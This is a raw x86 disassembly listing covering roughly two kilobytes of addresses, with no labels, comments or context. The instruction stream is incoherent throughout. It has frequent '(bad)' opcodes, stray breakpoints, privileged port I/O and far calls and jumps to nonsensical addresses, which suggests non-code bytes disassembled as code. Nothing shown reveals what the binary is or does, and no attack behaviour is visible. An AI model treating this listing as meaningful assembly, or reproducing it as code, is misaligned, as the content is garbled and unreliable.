  428062:	inc    DWORD PTR [ebx-0x76ff009b]
  428068:	xlat   BYTE PTR ds:[ebx]
  428069:	push   DWORD PTR [eax-0xa087c1d]
  42806f:	cld    
  428070:	int3   
  428071:	mov    dh,0xff
  428073:	add    DWORD PTR [esi-0x4003377],0xffffff89
  42807a:	pusha  
  42807b:	xor    bh,bh
  42807d:	in     al,0x85
  42807f:	clc    
  428080:	mov    DWORD PTR [ecx+0x0],esi
  428083:	dec    DWORD PTR [edi+0x280000ff]
  428089:	add    BYTE PTR [ebx],bl
  42808b:	jbe    0x42808d
  42808d:	sar    DWORD PTR [edx-0x7cfa3384],1
  428093:	add    BYTE PTR [edx+0x59ffcc83],al
  428099:	cmp    DWORD PTR [ebx+edx*1],0xffffffcc
  42809d:	iret   
  42809e:	push   ecx
  42809f:	inc    DWORD PTR fs:[edi+edi*8]
  4280a3:	add    BYTE PTR [ebx],bh
  4280a5:	int3   
  4280a6:	(bad)  
  4280a7:	jmp    DWORD PTR [edx-0x1]
  4280aa:	ror    DWORD PTR [ecx-0x34],1
  4280ad:	push   ebp
  4280ae:	lahf   
  4280af:	xchg   bh,bh
  4280b1:	mov    DWORD PTR cs:[ebx-0x3300004f],eax
  4280b8:	xor    edi,edi
  4280ba:	mov    bh,0x1
  4280bc:	(bad)  
  4280bd:	in     al,dx
  4280be:	pop    es
  4280bf:	mov    eax,ds:0x18ff
  4280c4:	inc    esp
  4280c5:	inc    DWORD PTR [eax]
  4280c7:	call   DWORD PTR [eax+eax*1]
  4280ca:	add    eax,0x9801ffd9
  4280cf:	jae    0x4280d1
  4280d1:	imul   edi,edi,0x0
  4280d4:	cmp    al,BYTE PTR [eax]
  4280d6:	int3   
  4280d7:	call   ebp
  4280d9:	int3   
  4280da:	jg     0x428124
  4280dc:	add    BYTE PTR [edi+esi*2-0x860019],ch
  4280e3:	mov    DWORD PTR [eax],edi
  4280e5:	int3   
  4280e6:	mov    esp,ecx
  4280e8:	hlt    
  4280e9:	inc    DWORD PTR [eax+0x34]
  4280ec:	inc    DWORD PTR [esi]
  4280ee:	sub    al,0x65
  4280f0:	add    BYTE PTR ds:0xffe8ccff,cl
  4280f6:	add    BYTE PTR [eax],al
  4280f8:	test   al,0xff
  4280fa:	inc    ebp
  4280fb:	bound  ecx,QWORD PTR [ecx-0x7c28d69b]
  428101:	stos   DWORD PTR es:[edi],eax
  428102:	int3   
  428103:	inc    DWORD PTR [edx+0x3283ff83]
  428109:	add    BYTE PTR ds:0xbc18ccd1,ah
  42810f:	jmp    FWORD PTR [bx-0x7d]
  428114:	jne    0x428115
  428116:	inc    DWORD PTR [eax]
  428118:	data16 add ch,bl
  42811b:	push   ebx
  42811c:	add    BYTE PTR [eax+0x66],bh
  42811f:	add    BYTE PTR [eax],al
  428121:	ja     0x4280ef
  428123:	add    BYTE PTR [ecx-0x5b000001],ah
  428129:	inc    DWORD PTR [esp+edi*2-0x1]
  42812d:	pop    ss
  42812e:	pop    es
  42812f:	or     edi,edi
  428131:	adc    BYTE PTR [ebx-0x7cff0201],al
  428137:	int3   
  428138:	add    bh,bh
  42813a:	das    
  42813b:	dec    edx
  42813c:	add    BYTE PTR [ebx+0x2b],al
  42813f:	cmp    bh,bh
  428141:	inc    edi
  428142:	inc    DWORD PTR [eax]
  428144:	mov    edx,0xde00ff89
  428149:	adc    ebp,0xffffffba
  42814c:	int3   
  42814d:	push   ds
  42814e:	test   al,0x73
  428150:	(bad)  
  428151:	out    dx,eax
  428152:	(bad)  
  428153:	call   DWORD PTR [eax-0x417cff01]
  428159:	int3   
  42815a:	xchg   ebp,eax
  42815b:	push   0xffffffcc
  42815d:	or     dl,BYTE PTR [esi+0x7f]
  428160:	add    BYTE PTR [edi],dl
  428162:	add    ah,cl
  428164:	pop    edx
  428165:	(bad)  
  428166:	inc    DWORD PTR [eax]
  428168:	push   ds
  428169:	inc    DWORD PTR [esi]
  42816b:	fdiv   st(7),st
  42816d:	bound  ebx,QWORD PTR [esi+0xe900ef]
  428173:	add    dl,ch
  428175:	add    BYTE PTR [eax],al
  428177:	sbb    eax,0x0
  42817a:	ds or  bh,bh
  42817d:	outs   dx,BYTE PTR ds:[esi]
  42817e:	test   DWORD PTR [esi],ecx
  428180:	jmp    FWORD PTR [ebp+0x8bff83]
  428186:	add    bh,bh
  428188:	loope  0x42810d
  42818a:	into   
  42818b:	cmc    
  42818c:	add    BYTE PTR [ebp+0xd],dh
  42818f:	jno    0x428191
  428191:	pop    esp
  428192:	add    DWORD PTR [eax],0xffffffdc
  428195:	or     esp,0xffffffff
  428198:	mov    eax,ds:0xef44ff
  42819d:	xchg   edi,eax
  42819e:	inc    edi
  42819f:	xor    edi,edi
  4281a1:	retf   0xffff
  4281a4:	add    edi,edi
  4281a6:	inc    DWORD PTR [eax]
  4281a8:	pop    es
  4281a9:	add    BYTE PTR [ecx+0x3227ff97],cl
  4281af:	in     al,dx
  4281b0:	add    BYTE PTR [edi],dh
  4281b2:	dec    esp
  4281b4:	cmc    
  4281b5:	inc    DWORD PTR [eax]
  4281b7:	sub    DWORD PTR [ebp-0x1],0x34
  4281bb:	lock mov DWORD PTR [esi],ebp
  4281be:	das    
  4281bf:	call   FWORD PTR gs:[edi+edi*8-0x33f57d]
  4281c7:	(bad)  
  4281c8:	call   0xff47a9cc
  4281cd:	mov    edx,0x7fff24e7
  4281d2:	inc    DWORD PTR [eax]
  4281d4:	inc    edi
  4281d5:	int3   
  4281d6:	inc    DWORD PTR [ebx+0x1b56cc33]
  4281dc:	xor    DWORD PTR [ebx],0xffffffb2
  4281df:	xchg   ecx,eax
  4281e0:	xor    DWORD PTR [edi+edi*8-0x77],0xffffffd8
  4281e5:	int3   
  4281e6:	cmp    edi,0x29
  4281e9:	add    dh,al
  4281eb:	jno    0x4281ed
  4281ed:	lods   al,BYTE PTR ds:[esi]
  4281ee:	inc    eax
  4281ef:	adc    edi,edi
  4281f1:	inc    esi
  4281f2:	(bad)  
  4281f3:	jmp    DWORD PTR [ebx]
  4281f5:	add    DWORD PTR [ebx-0x307c1601],0xffffff87
  4281fc:	add    BYTE PTR [ecx-0xc],al
  4281ff:	mov    DWORD PTR [ecx+0x7100ffac],ecx
  428205:	cmp    edi,0x0
  428208:	repnz add DWORD PTR [esi-0x5c1d0091],0xffffff9b
  428210:	jmp    DWORD PTR [edi+0xecc83]
  428216:	add    bh,bh
  428218:	cmp    ecx,esp
  42821a:	mov    ebx,0x6dc1007c
  42821f:	jmp    DWORD PTR [bp+di-0x7d]
  428223:	dec    DWORD PTR [edx]
  428225:	int3   
  428226:	add    ah,cl
  428228:	into   
  428229:	add    BYTE PTR [ecx+ecx*4],dl
  42822c:	add    BYTE PTR [esi],ch
  42822e:	mov    bl,0x2
  428230:	add    BYTE PTR [edi],dl
  428232:	inc    DWORD PTR [eax]
  428234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428235:	(bad)  
  428236:	inc    DWORD PTR [eax]
  428238:	or     BYTE PTR [ebx-0x170003fb],al
  42823e:	(bad)  
  428240:	add    cl,al
  428242:	cmp    edi,0x45
  428245:	add    BYTE PTR [ecx-0x39ff8801],cl
  42824b:	ud0    esi,edi
  42824e:	imul   esi,DWORD PTR [esi-0x1],0x23ff007d
  428255:	(bad)  
  428256:	dec    DWORD PTR [ecx-0x5d7200be]
  42825c:	sub    DWORD PTR [esi],0x3e
  42825f:	call   0xffa5:0x83ccd089
  428266:	add    bh,bh
  428268:	adc    al,0x0
  42826a:	sub    DWORD PTR [eax-0x77808b01],eax
  428270:	adc    DWORD PTR [esp+ecx*8-0x7c9501],0xffffffff
  428278:	clc    
  428279:	call   FWORD PTR [edx]
  42827b:	rol    DWORD PTR [eax],1
  42827d:	push   cs
  42827e:	ror    ebx,0x83
  428281:	and    eax,DWORD PTR [eax]
  428283:	add    BYTE PTR [ebx+eax*4-0xb0077],ah
  42828a:	jp     0x428233
  42828c:	add    BYTE PTR [edx-0x6b0049b5],dl
  428292:	add    DWORD PTR [eax],0xffffff81
  428295:	add    BYTE PTR [eax],al
  428297:	add    BYTE PTR [eax+0xb511ff],cl
  42829d:	leave  
  42829e:	add    al,0x83
  4282a0:	cmp    DWORD PTR [esi],0xffffffff
  4282a3:	add    BYTE PTR [ebx+0x0],ch
  4282a6:	(bad)  
  4282a7:	(bad)  
  4282a8:	jmp    0x8a1bd3ad
  4282ad:	push   ss
  4282ae:	call   0x25ff:0xcc3ecc50
  4282b5:	cmp    edi,0xffffffff
  4282b8:	outs   dx,DWORD PTR ds:[esi]
  4282b9:	int3   
  4282ba:	add    ecx,DWORD PTR [ecx-0x1]
  4282bd:	icebp  
  4282be:	aam    0x14
  4282c0:	add    ch,ah
  4282c2:	(bad)  
  4282c3:	call   ebp
  4282c5:	add    bh,bh
  4282c7:	push   DWORD PTR [ebp-0x1]
  4282ca:	jno    0x4282d9
  4282cc:	push   DWORD PTR [edi-0x800f9b3]
  4282d2:	(bad)  
  4282d3:	jmp    edx
  4282d5:	inc    DWORD PTR [ebx-0x1cfff301]
  4282db:	push   edi
  4282dc:	and    DWORD PTR [edx-0x5c],0x67
  4282e0:	jmp    DWORD PTR [ebp-0x77]
  4282e3:	add    al,bl
  4282e5:	int3   
  4282e6:	add    bh,bh
  4282e8:	int    0xff
  4282ea:	(bad)  
  4282eb:	mov    edi,edi
  4282ed:	stc    
  4282ee:	jns    0x4282c6
  4282f0:	call   DWORD PTR [eax]
  4282f2:	(bad)  
  4282f3:	jmp    FWORD PTR [edi]
  4282f5:	add    bh,bh
  4282f7:	add    ch,bh
  4282f9:	add    BYTE PTR [ebx+0xf],al
  4282fc:	mov    DWORD PTR [esi],ebp
  4282fe:	jp     0x428349
  428300:	add    BYTE PTR [eax+eax*1-0xffaa00],ch
  428307:	call   DWORD PTR [edi+edi*8+0x3]
  42830b:	out    dx,al
  42830c:	add    BYTE PTR [ebp+0x68],bl
  42830f:	jno    0x428310
  428311:	aaa    
  428312:	(bad)  
  428313:	jmp    FWORD PTR [edx+0x6c0000ff]
  428319:	add    BYTE PTR [edx+0x371ccc1d],al
  42831f:	bnd call eax
  428322:	add    bh,bh
  428324:	jne    0x428326
  428326:	mov    DWORD PTR [ecx-0x73c7ffed],ecx
  42832c:	add    BYTE PTR [ebx+0x7],dh
  42832f:	pop    ss
  428330:	add    BYTE PTR [ebx+0x0],ah
  428333:	jmp    DWORD PTR [eax+0x21ff00cc]
  428339:	add    BYTE PTR [edx+0x3e],al
  42833c:	add    BYTE PTR [esi+0x3f],ch
  42833f:	pushf  
  428340:	add    BYTE PTR [eax-0x1],ah
  428343:	add    BYTE PTR [eax+0x0],dh
  428346:	(bad)  
  428347:	jmp    ebp
  428349:	dec    DWORD PTR [ebx]
  42834b:	test   BYTE PTR [eax],0xae
  42834e:	in     al,dx
  42834f:	stos   DWORD PTR es:[edi],eax
  428350:	push   eax
  428352:	int3   
  428353:	add    BYTE PTR [ebp-0x1],cl
  428356:	cmp    edi,0xffffffad
  428359:	sub    DWORD PTR [eax-0x60c6005f],0xffffffe4
  428360:	add    BYTE PTR [eax+0x6fffff],dl
  428366:	cmp    edi,0xffffff8b
  428369:	add    ebp,0x60
  42836c:	int3   
  42836d:	jg     0x4283ba
  42836f:	scas   al,BYTE PTR es:[edi]
  428370:	add    BYTE PTR [edx-0x7c150034],cl
  428376:	dec    DWORD PTR [ecx-0x22b10099]
  42837c:	add    ebx,0xffffffaf
  42837f:	or     eax,0xff55ff
  428384:	arpl   di,di
  428386:	add    BYTE PTR [eax],al
  428388:	jb     0x428356
  42838a:	std    
  42838b:	ja     0x428316
  42838d:	mov    al,0x4c
  42838f:	sbb    BYTE PTR [ebx+0x300ff98],al
  428395:	mov    edi,edi
  428397:	and    DWORD PTR [edx+0x0],0x13
  42839b:	add    BYTE PTR fs:[edi+edi*1],al
  42839f:	cmp    bh,bh
  4283a1:	sub    al,0xff
  4283a3:	add    bl,dl
  4283a5:	(bad)  
  4283a6:	inc    DWORD PTR [eax]
  4283a8:	call   DWORD PTR cs:[edi]
  4283ab:	jecxz  0x4283ad
  4283ad:	xchg   edi,eax
  4283ae:	mov    dh,0xe4
  4283b0:	call   DWORD PTR [edx-0xe10100]
  4283b6:	add    bh,bh
  4283b8:	inc    edi
  4283b9:	add    BYTE PTR [eax],al
  4283bb:	mov    dh,0xff
  4283bd:	pushf  
  4283be:	rcr    DWORD PTR [ebx],1
  4283c0:	dec    DWORD PTR [edx-0x1]
  4283c3:	cmp    DWORD PTR [edx+0x29ff83cc],0xffffffcc
  4283ca:	stc    
  4283cb:	push   0xffffff83
  4283cd:	fild   DWORD PTR [eax]
  4283cf:	adc    bh,bh
  4283d1:	imul   edi,edi,0xfaff
  4283d7:	int3   
  4283d8:	ud0    ebx,DWORD PTR [ebx]
  4283db:	sub    al,0x0
  4283dd:	or     eax,0x5affa4c1
  4283e2:	mov    edi,edi
  4283e4:	inc    esp
  4283e5:	mov    DWORD PTR [eax],eax
  4283e7:	jmp    DWORD PTR [ebp-0x9e700]
  4283ed:	in     al,dx
  4283ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283ef:	xchg   ecx,eax
  4283f0:	add    al,ch
  4283f2:	int3   
  4283f3:	mov    DWORD PTR [esi-0x6a003400],eax
  4283f9:	add    eax,0xffffffa3
  4283fc:	adc    DWORD PTR [ebp-0x16],0xffffffc4
  428400:	or     edi,0xffffffff
  428403:	int3   
  428404:	push   0xffffffff
  428406:	add    bh,bh
  428408:	fild   WORD PTR [eax]
  42840a:	mov    WORD PTR [esi+0x5fd02a83],?
  428410:	dec    DWORD PTR [edi]
  428412:	(bad)  
  428413:	inc    esp
  428415:	(bad)  
  428416:	inc    DWORD PTR [eax]
  428418:	add    BYTE PTR ss:[edi+esi*1+0x255cfb00],al
  428420:	int3   
  428421:	ins    BYTE PTR es:[edi],dx
  428422:	int3   
  428423:	int3   
  428424:	push   ebx
  428425:	(bad)  
  428426:	dec    esp
  428428:	mov    esi,0xff80dfff
  42842d:	sar    BYTE PTR [ebx-0xb9ffe2],cl
  428433:	or     DWORD PTR [eax+eax*1],0xffffffff
  428437:	int3   
  428438:	inc    BYTE PTR [eax]
  42843a:	sbb    al,0x2d
  42843c:	add    BYTE PTR [edi-0x46],ch
  42843f:	push   esp
  428440:	mov    ebx,ecx
  428442:	int3   
  428443:	jmp    DWORD PTR [edx+0x31ff00ff]
  428449:	jmp    FWORD PTR [esi-0x47]
  42844c:	int3   
  42844d:	or     BYTE PTR [ebp-0x4a],0xff
  428451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428452:	add    BYTE PTR [ecx-0xffffbc],cl
  428458:	mov    eax,ds:0x4f97ff
  42845d:	aas    
  42845e:	and    dl,BYTE PTR [ebx-0x1]
  428461:	fild   DWORD PTR [eax]
  428463:	push   esp
  428465:	add    BYTE PTR [ebx-0x3dff7201],al
  42846b:	xchg   esi,eax
  42846c:	add    BYTE PTR [edi+0x4583378a],ah
  428472:	inc    DWORD PTR [ebx+0x89ff63]
  428478:	xor    edi,edi
  42847a:	push   es
  42847b:	xchg   esi,eax
  42847c:	call   DWORD PTR [edi+0x8]
  42847f:	dec    edi
  428480:	mov    DWORD PTR [eax+0x0],ebx
  428483:	jmp    DWORD PTR [ebx]
  428485:	add    bh,bh
  428487:	int3   
  428488:	cs add ah,ch
  42848b:	addr16 (bad) 
  42848d:	cld    
  42848e:	inc    edx
  42848f:	loope  0x42845d
  428491:	inc    BYTE PTR [eax]
  428493:	add    BYTE PTR [eax+0x3f00ff89],bh
  428499:	add    dl,dh
  42849b:	add    DWORD PTR [eax],eax
  42849d:	adc    eax,0x9cff286f
  4284a2:	add    DWORD PTR [eax],0xffffff9e
  4284a5:	add    DWORD PTR [eax],0xffffff83
  4284a8:	sar    bh,cl
  4284aa:	pop    edi
  4284ab:	push   eax
  4284ac:	(bad)  
  4284ad:	mov    esp,0xee83a8da
  4284b2:	add    BYTE PTR [ebx-0x3300ff74],al
  4284b8:	mov    ebx,0x1c54ff
  4284bd:	jl     0x4284e7
  4284bf:	stos   BYTE PTR es:[edi],al
  4284c0:	adc    esp,0xffffff89
  4284c3:	push   esi
  4284c5:	inc    DWORD PTR [ebx+0x51ffc4ff]
  4284cb:	fld    QWORD PTR [ebx+0x52b57c]
  4284d1:	adc    eax,DWORD PTR [eax]
  4284d3:	inc    DWORD PTR [eax+0x0]
  4284d6:	int3   
  4284d7:	add    BYTE PTR [eax-0xf1de77],dl
  4284dd:	(bad)  
  4284de:	outs   dx,DWORD PTR ds:[esi]
  4284df:	jne    0x428464
  4284e1:	mov    ebp,0x83638383
  4284e6:	inc    DWORD PTR [eax]
  4284e8:	lea    eax,[eax]
  4284ea:	xchg   ebx,eax
  4284eb:	adc    bh,bh
  4284ed:	sbb    eax,0x71ff4d76
  4284f2:	add    BYTE PTR [eax],al
  4284f4:	xor    edi,edi
  4284f6:	mov    edi,edi
  4284f8:	sbb    al,0xcc
  4284fa:	(bad)  [eax]
  4284fc:	sub    DWORD PTR [edx+0x5eff6ea7],0xffffff83
  428503:	add    BYTE PTR [ecx-0x34],ch
  428506:	add    DWORD PTR [ebx+0x77f48940],0xffffff89
  42850d:	daa    
  42850e:	sub    BYTE PTR [ecx-0x1],dl
  428511:	test   BYTE PTR [ebx-0xff4801],al
  428517:	int3   
  428518:	dec    eax
  428519:	add    BYTE PTR [edx+0x1a],dh
  42851c:	mov    DWORD PTR [edi],eax
  42851e:	sbb    dh,BYTE PTR [eax-0x7d]
  428521:	jecxz  0x428523
  428523:	(bad)  
  428524:	call   0xf4384f5
  428529:	mov    DWORD PTR [ebx-0x48],esp
  42852c:	call   FWORD PTR [esi+0x7eccc04e]
  428532:	inc    DWORD PTR [eax]
  428534:	pop    ecx
  428535:	inc    DWORD PTR [eax]
  428537:	add    BYTE PTR [ebp-0x1],ch
  42853a:	out    dx,al
  42853b:	aas    
  42853c:	int3   
  42853d:	lock leave 
  42853f:	xchg   edx,eax
  428540:	add    edx,0xffffff83
  428543:	add    BYTE PTR [eax],bl
  428545:	(bad)  
  428546:	inc    DWORD PTR [ebx+0x7dfb0095]
  42854c:	jmp    edx
  42854e:	das    
  42854f:	inc    ebx
  428550:	jmp    FWORD PTR [edx]
  428552:	int3   
  428553:	jmp    DWORD PTR [edi-0x1]
  428556:	inc    DWORD PTR [ebx+0x12a9ff82]
  42855c:	add    dh,dl
  42855e:	out    dx,eax
  42855f:	(bad)  
  428560:	jmp    FWORD PTR [edx]
  428562:	cmp    edi,0x3b
  428565:	int3   
  428566:	inc    DWORD PTR [eax]
  428568:	lods   al,BYTE PTR ds:[esi]
  428569:	add    al,dl
  42856b:	sbb    eax,DWORD PTR [eax]
  42856d:	ss cmp al,0x87
  428570:	call   FWORD PTR [ebx-0x40001]
  428576:	add    BYTE PTR [ebx-0xfbc0074],al
  42857c:	jmp    DWORD PTR [edx-0x22]
  42857f:	inc    edx
  428580:	call   DWORD PTR [edx+0x0]
  428583:	add    BYTE PTR [ecx-0x1],al
  428586:	add    DWORD PTR [ebx+0x5ab8ff67],0xffffffff
  42858d:	jno    0x4285cf
  42858f:	mov    esi,0xff00
  428594:	jno    0x428595
  428596:	add    DWORD PTR [eax],0xfffffff7
  428599:	call   DWORD PTR [esi]
  42859b:	pop    ss
  42859c:	push   DWORD PTR [edi+0x30]
  42859f:	(bad)  
  4285a0:	jmp    DWORD PTR [edi+0x8b89cc]
  4285a6:	mov    esp,ecx
  4285a8:	loop   0x4285aa
  4285aa:	xchg   BYTE PTR [esi-0x13678377],dl
  4285b0:	add    BYTE PTR [ecx],bh
  4285b2:	add    ah,cl
  4285b4:	enter  0xff00,0xff
  4285b8:	xchg   BYTE PTR [eax],al
  4285ba:	xor    edi,ebx
  4285bc:	or     edx,0x6e
  4285bf:	test   BYTE PTR [eax],0x5c
  4285c2:	add    BYTE PTR [eax],al
  4285c4:	dec    ebx
  4285c5:	add    BYTE PTR [ebx+0x5acc7589],al
  4285cb:	fadd   DWORD PTR [eax]
  4285cd:	mov    ds:0x75ff0466,al
  4285d2:	int3   
  4285d3:	add    al,dh
  4285d5:	add    bh,bh
  4285d7:	jmp    FWORD PTR [edi]
  4285d9:	mov    ebp,edi
  4285db:	dec    edi
  4285dc:	mov    DWORD PTR [edx],ebx
  4285de:	jbe    0x4285fd
  4285e0:	jmp    DWORD PTR [ebp-0x34]
  4285e3:	call   FWORD PTR [ebx]
  4285e5:	(bad)  
  4285e6:	(bad)  
  4285e7:	dec    DWORD PTR [edx]
  4285e9:	add    BYTE PTR [ebx],ah
  4285eb:	jecxz  0x428576
  4285ed:	sub    BYTE PTR [ecx+0x1d894e],0x0
  4285f4:	(bad)  
  4285f5:	(bad)  
  4285f6:	inc    DWORD PTR [eax]
  4285f8:	popf   
  4285f9:	call   DWORD PTR [ecx+0x28b083ec]
  4285ff:	add    cl,ah
  428601:	dec    ecx
  428602:	inc    DWORD PTR [ebx-0x7c7652]
  428608:	mov    es,WORD PTR [eax]
  42860a:	dec    edx
  42860b:	sar    bh,0x8a
  42860e:	cmp    BYTE PTR [edi+edi*8-0x51],bh
  428612:	or     DWORD PTR [ecx-0x7c7cff44],0xffffffff
  428619:	dec    eax
  42861b:	or     al,0xff
  42861d:	cmp    DWORD PTR [edi-0x7cf00051],eax
  428623:	adc    DWORD PTR [edi-0x1],0x0
  428627:	add    BYTE PTR [edi+edi*8-0x53765537],bl
  42862e:	dec    ebx
  42862f:	pop    ecx
  428630:	or     DWORD PTR [esi+0x3fff83],0xffffff83
  428637:	mov    DWORD PTR [edi],ecx
  428639:	add    BYTE PTR [ebp+0x7a],bh
  42863c:	int3   
  42863d:	xchg   esp,eax
  42863e:	push   es
  42863f:	push   ss
  428640:	call   DWORD PTR [ebx]
  428642:	dec    esp
  428644:	cld    
  428645:	add    BYTE PTR [eax],al
  428647:	add    BYTE PTR [ebx-0x1],dh
  42864a:	add    ch,BYTE PTR [edx-0xb875f34]
  428650:	jmp    FWORD PTR [eax]
  428652:	int3   
  428653:	int3   
  428654:	jae    0x428655
  428656:	add    bh,bh
  428658:	push   eax
  428659:	sub    ebx,0x77
  42865c:	jmp    DWORD PTR [ebp+0x1100be12]
  428662:	int3   
  428663:	add    BYTE PTR [ebp-0x3500ff7d],bl
  428669:	add    al,ah
  42866b:	cmc    
  42866c:	push   DWORD PTR [edx-0x62]
  42866f:	mov    bh,0xff
  428671:	je     0x428672
  428673:	cmp    DWORD PTR [edi+0x0],0xffffffff
  428677:	add    DWORD PTR [ebx-0x1],0xffffffe0
  42867b:	les    eax,FWORD PTR [eax]
  42867d:	adc    BYTE PTR [ecx+esi*8],bl
  428680:	add    bh,al
  428682:	add    bh,bh
  428684:	push   esp
  428685:	inc    DWORD PTR [ebx+0x5effba89]
  42868b:	out    0xcc,eax
  42868d:	jnp    0x42863d
  42868f:	xchg   edx,eax
  428690:	int3   
  428691:	and    eax,0xb10083
  428696:	dec    esp
  428698:	leave  
  428699:	int3   
  42869a:	rcr    BYTE PTR [edx+0x79079283],cl
  4286a0:	call   FWORD PTR [ecx+0x0]
  4286a3:	add    BYTE PTR [ebp-0x77],ch
  4286a6:	add    bh,bh
  4286a8:	xor    BYTE PTR [eax],al
  4286aa:	jae    0x428679
  4286ac:	call   DWORD PTR [ebx+0x69ff8625]
  4286b2:	inc    DWORD PTR [ebx-0x33ff00ba]
  4286b8:	inc    edi
  4286b9:	add    dh,ah
  4286bb:	xor    eax,0x7d11d7ff
  4286c0:	add    cl,ch
  4286c2:	add    bh,bh
  4286c4:	jmp    0x4286c5
  4286c6:	or     DWORD PTR [ecx+0x6493ff79],0x0
  4286cd:	and    DWORD PTR [edx-0x2],esi
  4286d0:	add    BYTE PTR [eax],cl
  4286d2:	or     esp,0x71
  4286d5:	int3   
  4286d6:	add    bh,bh
  4286d8:	pop    esp
  4286d9:	inc    DWORD PTR [ecx+0x7d]
  4286dc:	mov    esi,ecx
  4286de:	mov    esi,0xff758903
  4286e3:	add    bl,ah
  4286e5:	int3   
  4286e6:	dec    DWORD PTR [ecx-0xc4cff7c]
  4286ec:	add    BYTE PTR [ebp+0x7effc328],dh
  4286f2:	cmp    edi,0xffffffd1
  4286f5:	(bad)  
  4286f6:	dec    esp
  4286f8:	out    dx,eax
  4286f9:	add    BYTE PTR ds:0x412effe1,ah
  4286ff:	xchg   esp,eax
  428700:	push   ebp
  428702:	(bad)  
  428703:	call   FWORD PTR [edi+edi*8-0x77]
  428707:	call   FWORD PTR [edi+edi*8-0x4d0069ee]
  42870e:	mov    bl,0x6b
  428710:	dec    esi
  428712:	cmp    edi,0xffffffc2
  428715:	or     DWORD PTR [ecx-0x5a000d01],0xffffffa9
  42871c:	and    DWORD PTR [edx+0x38],0xffffffe2
  428720:	add    BYTE PTR [edi],dl
  428722:	inc    DWORD PTR [ebx-0x7c78]
  428728:	dec    eax
  428729:	add    BYTE PTR [edi],cl
  42872b:	push   cs
  42872c:	call   FWORD PTR [eax+0x32]
  42872f:	sub    bh,bh
  428731:	mov    ds:0xff5dff00,eax
  428736:	add    DWORD PTR [ebx-0x13a5ffc0],0xffffff89
  42873d:	mov    ch,0xc0
  42873f:	pop    edx
  428740:	int3   
  428741:	push   esp
  428742:	add    BYTE PTR [eax],al
  428744:	jmp    0x3b418848
  428749:	dec    DWORD PTR [edx-0x6ff70079]
  42874f:	xchg   edx,eax
  428750:	call   FWORD PTR [ecx-0x1]
  428753:	int3   
  428754:	lahf   
  428755:	cmp    edi,0xffffff83
  428758:	mov    cl,0x0
  42875a:	arpl   WORD PTR [esi-0x77],di
  42875d:	pop    eax
  42875e:	and    DWORD PTR ds:0xff3883,0xffffff90
  428765:	inc    DWORD PTR [eax]
  428767:	call   FWORD PTR [edi]
  428769:	dec    ebx
  42876b:	add    al,0xff
  42876d:	lahf   
  42876e:	in     eax,dx
  42876f:	mov    al,0x0
  428771:	jo     0x42873f
  428773:	sub    DWORD PTR ds:0xde008300,0x0
  42877a:	jmp    0x428775
  42877c:	add    BYTE PTR [ebx-0x16],dl
  42877f:	mov    eax,0xcc897283
  428784:	imul   edi,edi,0x0
  428787:	call   DWORD PTR [eax]
  428789:	int3   
  42878a:	sahf   
  42878b:	fisttp DWORD PTR [ecx-0xf1f4a2]
  428791:	add    al,0x83
  428793:	add    BYTE PTR [edx-0x1],cl
  428796:	(bad)  
  428797:	dec    DWORD PTR [eax]
  428799:	add    BYTE PTR [edx-0x32],al
  42879c:	int3   
  42879d:	jl     0x42879c
  42879f:	aas    
  4287a0:	add    BYTE PTR [edi+edi*8+0x892d00],dh
  4287a7:	add    bl,dl
  4287a9:	dec    DWORD PTR [edx-0x53]
  4287ac:	call   DWORD PTR [esi+0x58895d78]
  4287b2:	(bad)  
  4287b3:	(bad)  
  4287b4:	sti    
  4287b5:	mov    edi,edi
  4287b7:	inc    DWORD PTR [edi+0x0]
  4287ba:	xchg   ebx,eax
  4287bb:	inc    esi
  4287bc:	add    BYTE PTR [esi-0x7b],bl
  4287bf:	dec    edi
  4287c0:	push   DWORD PTR [eax]
  4287c2:	(bad)  
  4287c3:	inc    DWORD PTR [esi-0x34]
  4287c6:	or     esp,0xfffffff5
  4287c9:	(bad)  
  4287ca:	cmp    al,0x41
  4287cc:	mov    DWORD PTR [esi-0x2476ba89],ebx
  4287d2:	add    BYTE PTR [eax],al
  4287d4:	pop    ecx
  4287d5:	add    bh,bh
  4287d7:	add    BYTE PTR [esi],dh
  4287d9:	call   FWORD PTR [edi+0x3d]
  4287dc:	and    ebp,0x2c
  4287df:	mov    esi,0x27ff
  4287e4:	xor    edi,edi
  4287e6:	int3   
  4287e7:	mov    DWORD PTR [edx-0x683677],esi
  4287ed:	cli    
  4287ee:	stos   DWORD PTR es:[edi],eax
  4287ef:	pop    ecx
  4287f0:	add    BYTE PTR [ecx],dh
  4287f2:	add    DWORD PTR [eax],0x6f
  4287f5:	(bad)  
  4287f6:	(bad)  
  4287f7:	(bad)  
  4287f8:	jmp    0x842487fc
  4287fd:	inc    edx
  4287fe:	stos   DWORD PTR es:[edi],eax
  4287ff:	cmp    eax,0xff5289
  428804:	dec    ecx
  428805:	add    DWORD PTR [ebx+0x39002100],0x4e
  42880c:	xor    DWORD PTR [edi+0x2b],0x7b
  428810:	add    cl,bh
  428812:	add    BYTE PTR [eax],al
  428814:	mov    ebp,0xa89cc00
  428819:	jmp    DWORD PTR [ebx]
  42881b:	lahf   
  42881c:	push   DWORD PTR [eax-0x4876d0b9]
  428822:	add    BYTE PTR [ebx-0x760076],al
  428828:	verw   WORD PTR [eax+0xc500ac]
  42882f:	pop    esi
  428830:	mov    DWORD PTR [edx-0x557d00],edi
  428836:	inc    DWORD PTR [eax]
  428838:	push   edi
  428839:	add    BYTE PTR [eax],dh
  42883b:	push   edi
  42883c:	call   eax
  42883e:	cmp    esi,ecx
  428840:	add    BYTE PTR ds:0x83fa00ff,bh
  428846:	dec    DWORD PTR [ecx-0x61fe001e]
  42884c:	add    BYTE PTR [edi],al
  42884e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42884f:	sar    edi,0x5f
  428852:	inc    DWORD PTR [eax]
  428854:	push   esp
  428855:	add    DWORD PTR [eax],0xffffffff
  428858:	push   ebx
  428859:	add    dl,cl
  42885b:	in     eax,0x0
  42885d:	cmp    esp,DWORD PTR [edx+ebp*4-0x701]
  428864:	ret    
  428865:	add    BYTE PTR [eax],al
  428867:	sub    DWORD PTR [edi-0xa42900],0xffffffc9
  42886e:	rcr    ah,0x83
  428871:	pop    esp
  428872:	dec    esp
  428874:	add    cl,BYTE PTR [ecx-0x770100]
  42887a:	dec    eax
  42887b:	mov    es,WORD PTR [eax]
  42887d:	les    esp,FWORD PTR [esi]
